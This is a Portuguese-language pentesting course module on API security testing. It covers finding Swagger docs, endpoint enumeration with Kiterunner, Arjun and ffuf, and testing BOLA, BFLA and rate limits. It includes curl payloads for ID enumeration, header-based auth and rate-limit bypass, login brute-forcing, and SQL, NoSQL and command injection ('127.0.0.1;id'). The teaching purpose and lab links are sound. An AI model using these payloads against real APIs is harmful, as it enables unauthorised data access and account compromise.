# 🔌 03. API Security — Reconhecimento, BOLA, BFLA e Automação

> 83% do tráfego web hoje é via APIs. Se você não sabe como testar APIs, está deixando o prêmio de lado.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 70min | ⭐⭐ Intermediário | `Kiterunner, Arjun, Nuclei, curl` |

</div>

---

## 🎓 Por que isso importa?

APIs são os "canos" que conectam aplicativos. Elas expõem dados e funcionalidades, e se não forem protegidas, podem dar acesso a TUDO. OWASP tem um Top 10 específico para APIs — e BOLA (Broken Object Level Authorization) é a vulnerabilidade #1.

**Analogia:** Imagine um predio com 100 salas. Cada sala tem um botão que abre a porta. Se qualquer botão abre qualquer porta, você pode entrar em qualquer sala — só precisa adivinhar o número.

**Impacto real:**
- **BOLA** — acessar dados de outros usuários (94% das APIs afetadas)
- **BFLA** — acessar funções de admin
- **Excessive Data Exposure** — API retorna mais dados que deveria
- **Broken Authentication** — bypass de autenticação

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| HTTP basics (métodos, headers) | Sim | Módulo 00 |
| JSON basics | Sim | — |
| Burp Suite | Sim | Arquivo 01 |

---

## 🎯 Quando testar API Security

- Quando a app usa **APIs REST ou GraphQL**
- Para testar **BOLA** (trocar IDs)
- Para testar **BFLA** (acessar admin)
- Para descobrir **endpoints ocultos**
- Para testar **rate limiting**
- Para testar **SSRF via APIs**

---

## 🔄 Como funciona na prática

```
┌──────────────┐         ┌──────────────────┐         ┌──────────────┐
│   Atacante   │ ──API──►│   App Web        │ ──query─►│   Backend    │
│              │         │  (autenticação)  │         │   (banco)    │
└──────────────┘         └──────────────────┘         └──────────────┘
                                │
                    ┌───────────┴───────────┐
                    │                       │
               Sem auth?               Auth fraca?
                    │                       │
                    ▼                       ▼
            ┌──────────────┐        ┌──────────────┐
            │  Dados       │        │  BOLA: IDs   │
            │  expostos    │        │  trocados    │
            └──────────────┘        └──────────────┘
```

---

## 🛠️ Ferramentas

### Instalação

```bash
# Kiterunner (enumeração de APIs)
go install github.com/assetnote/kiterunner@latest

# Arjun (descobrir parâmetros)
pip3 install arjun

# Nuclei (scan de APIs)
nuclei -update-templates

# curl + jq (já vem no Kali)
sudo apt install -y curl jq
```

### OWASP API Security Top 10 (2023)

| # | Vulnerabilidade | Descrição |
|---|-----------------|-----------|
| 1 | **BOLA** | Broken Object Level Authorization |
| 2 | **BFLA** | Broken Function Level Authorization |
| 3 | **Broken Authentication** | Autenticação fraca |
| 4 | **Unrestricted Resource Consumption** | Sem rate limiting |
| 5 | **Broken Function Level Authorization** | Acesso não autorizado |
| 6 | **Unrestricted Access to Sensitive Business Flows** | Fluxos sensíveis |
| 7 | **SSRF** | SSRF via API |
| 8 | **Security Misconfiguration** | Configurações erradas |
| 9 | **Improper Inventory Management** | APIs antigas expostas |
| 10 | **Unsafe Consumption of APIs** | Consumo inseguro |

---

## 📝 Passo 1: Encontrar Documentação

```bash
# URLs comuns de documentação
curl -s http://target.com/api-docs
curl -s http://target.com/swagger
curl -s http://target.com/swagger.json
curl -s http://target.com/swagger-ui/
curl -s http://target.com/openapi.json
curl -s http://target.com/api/v1/docs
curl -s http://target.com/docs
curl -s http://target.com/redoc
```

### Analisar Swagger/OpenAPI

```bash
# Baixar spec
curl -s http://target.com/swagger.json | jq . > swagger.json

# Listar todos os endpoints
jq '.paths | keys[]' swagger.json

# Listar métodos por endpoint
jq '.paths | to_entries[] | .key as $path | .value | keys[] | "\(. ) $path"' swagger.json

# Extrair schemas
jq '.components.schemas | keys[]' swagger.json
```

---

## 📝 Passo 2: Mapear Endpoints

### Kiterunner

```bash
# Scan de endpoints
kr scan http://target.com/api/ -w routes-large.kite

# Com métodos HTTP específicos
kr scan http://target.com/api/ -w routes-large.kite -x GET,POST,PUT

# Bruteforce de endpoints
kr bruteforce http://target.com/api/ -w common-api-extensions.txt
```

### Arjun

```bash
# Descobrir parâmetros
arjun -u http://target.com/api/

# Com wordlist
arjun -u http://target.com/api/ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Output JSON
arjun -u http://target.com/api/ -o params.json -f json
```

### ffuf para APIs

```bash
# Descobrir endpoints
ffuf -u http://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Descobrir versão
ffuf -u http://target.com/api/vFUZZ/users -w /usr/share/seclists/Discovery/Web-Content/api/versioning.txt

# Descobrir parâmetros
ffuf -u "http://target.com/api/users?FUZZ=1" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

---

## 📝 Passo 3: Analisar Autenticação

```bash
# Testar sem autenticação
curl http://target.com/api/users
# Se retornar 200 OK com dados → vulnerabilidade

# Testar com token inválido
curl -H "Authorization: Bearer invalid_token" http://target.com/api/users

# Testar com token de outro usuário
curl -H "Authorization: Bearer OTHER_USER_TOKEN" http://target.com/api/users

# Tipos de autenticação
curl -H "Authorization: Bearer TOKEN" http://target.com/api/users       # Bearer
curl -H "X-API-Key: YOUR_KEY" http://target.com/api/users               # API Key
curl -u user:pass http://target.com/api/users                            # Basic Auth
curl -b "session=abc123" http://target.com/api/users                     # Cookie
```

---

## 📝 Passo 4: Testar BOLA

BOLA é quando você pode acessar recursos de outros usuários apenas trocando IDs.

```bash
# Básico: trocar ID
curl http://target.com/api/users/1    # Seu usuário
curl http://target.com/api/users/2    # Outro usuário → BOLA!

# Enumerar IDs
for i in $(seq 1 100); do
  curl -s http://target.com/api/users/$i | jq '.email' 2>/dev/null
done

# Testar com UUIDs
curl http://target.com/api/users/550e8400-e29b-41d4-a716-446655440000

# Testar com IDs negativos e zero
curl http://target.com/api/users/-1
curl http://target.com/api/users/0

# Testar em diferentes endpoints
curl http://target.com/api/orders/123
curl http://target.com/api/orders/124
curl http://target.com/api/profile/1
curl http://target.com/api/profile/2
```

---

## 📝 Passo 5: Testar BFLA

BFLA é quando você acessa funções de administrador com conta normal.

```bash
# Endpoints admin
curl http://target.com/api/admin/users
curl http://target.com/api/admin/config
curl http://target.com/api/internal/config
curl http://target.com/api/debug/health

# Métodos perigosos
curl -X DELETE http://target.com/api/users/1
curl -X PUT http://target.com/api/users/1
curl -X PATCH http://target.com/api/users/1/role
curl -X POST http://target.com/api/admin/users

# Headers de bypass
curl -H "X-Admin: true" http://target.com/api/admin/users
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/api/admin/users
```

---

## 📝 Passo 6: Testar Rate Limiting

```bash
# Enviar 100 requests rápidas
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST http://target.com/api/login \
    -d '{"username":"admin","password":"test"}'
done

# Se não bloquear → vulnerabilidade

# Testar bypass de rate limit
curl -H "X-Forwarded-For: 1.2.3.4" http://target.com/api/login
curl -H "X-Originating-IP: 1.2.3.4" http://target.com/api/login
```

---

## 📝 Passo 7: Injeção em APIs

### SQL Injection

```bash
curl "http://target.com/api/users?search=admin' OR 1=1--"
curl -X POST http://target.com/api/search \
  -H "Content-Type: application/json" \
  -d '{"query": "admin'\'' OR 1=1--"}'
```

### NoSQL Injection

```bash
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
```

### Command Injection

```bash
curl "http://target.com/api/ping?host=127.0.0.1;id"
curl -X POST http://target.com/api/ping \
  -d '{"host": "127.0.0.1;id"}'
```

---

## 📝 Nuclei para APIs

```bash
# Scan de vulnerabilidades de API
nuclei -u http://target.com/api/ -t http/vulnerabilities/

# Templates específicos de API
nuclei -u http://target.com -tags api

# Scan de endpoints descobertos
cat endpoints.txt | nuclei -tags api -severity critical,high
```

---

## 📋 Fluxo de Teste API

```
┌─────────────────────────────────────────────────────────┐
│  1. DOCUMENTAÇÃO                                        │
│     - /swagger.json, /api-docs, /openapi.json           │
│     - Baixar spec e listar endpoints                     │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  2. MAPEAR ENDPOINTS                                    │
│     - Kiterunner, Arjun, ffuf                           │
│     - Testar todos os métodos HTTP                       │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  3. ANALISAR AUTH                                       │
│     - Testar sem token, token inválido                  │
│     - Identificar mecanismo de auth                      │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  4. TESTAR BOLA                                         │
│     - Trocar IDs em endpoints                            │
│     - Enumerar com IDs sequenciais e UUIDs               │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  5. TESTAR BFLA                                         │
│     - Acessar /admin com user normal                     │
│     - Testar métodos DELETE/PUT/PATCH                    │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  6. RATE LIMITING + INJEÇÃO                             │
│     - Testar brute force                                │
│     - Testar SQLi/NoSQLi em parâmetros                  │
└─────────────────────────────────────────────────────────┘
```

---

## ❌ Erros Comuns

| Erro | Solução |
|------|---------|
| "Não acho endpoints" | Usar Arjun/Kiterunner, não só ffuf |
| "BOLA não funciona" | Testar UUIDs, não só IDs sequenciais |
| "Auth retorna 401" | JWT pode estar válido → testar no jwt.io |
| "Rate limit bloqueia" | Usar X-Forwarded-For para bypass |

---

## 📋 Cheat Sheet Rápido

### URLs de Documentação

```
/swagger.json
/swagger-ui/
/api-docs
/openapi.json
/docs
/redoc
```

### Payloads BOLA

```bash
for i in $(seq 1 100); do curl -s http://target.com/api/users/$i | jq '.email' 2>/dev/null; done
curl http://target.com/api/users/-1
curl http://target.com/api/users/0
```

### Payloads BFLA

```bash
curl http://target.com/api/admin/users
curl -X DELETE http://target.com/api/users/1
curl -H "X-Admin: true" http://target.com/api/admin/config
```

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | Tópicos | Tempo |
|---|:----------:|:----|:--------|:-----:|
| 1 | PortSwigger | [API testing labs](https://portswigger.net/web-security/graphql) | GraphQL, introspection | 20min |
| 2 | TryHackMe | [API Hacking](https://tryhackme.com/room/apihacking) | BOLA, BFLA, auth | 45min |
| 3 | PortSwigger | [BOLA labs](https://portswigger.net/web-security/access-control) | IDOR em APIs | 30min |

---

## 📚 Referências

- [OWASP API Security Top 10](https://owasp.org/API-Security/)
- [PortSwigger — GraphQL](https://portswigger.net/web-security/graphql)
- [HackTricks — API Testing](https://book.hacktricks.xyz/pentesting-web/api-pentesting)
- [Kiterunner](https://github.com/assetnote/kiterunner)
- [Arjun](https://github.com/s0md3v/Arjun)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Encontrar documentação de APIs (Swagger, OpenAPI)
- [ ] Mapear endpoints com Kiterunner e Arjun
- [ ] Testar BOLA trocando IDs
- [ ] Testar BFLA acessando endpoints admin
- [ ] Analisar mecanismos de autenticação
- [ ] Testar rate limiting e bypass
- [ ] Injetar SQL/NoSQL em parâmetros de API
- [ ] Usar Nuclei para scanning de APIs
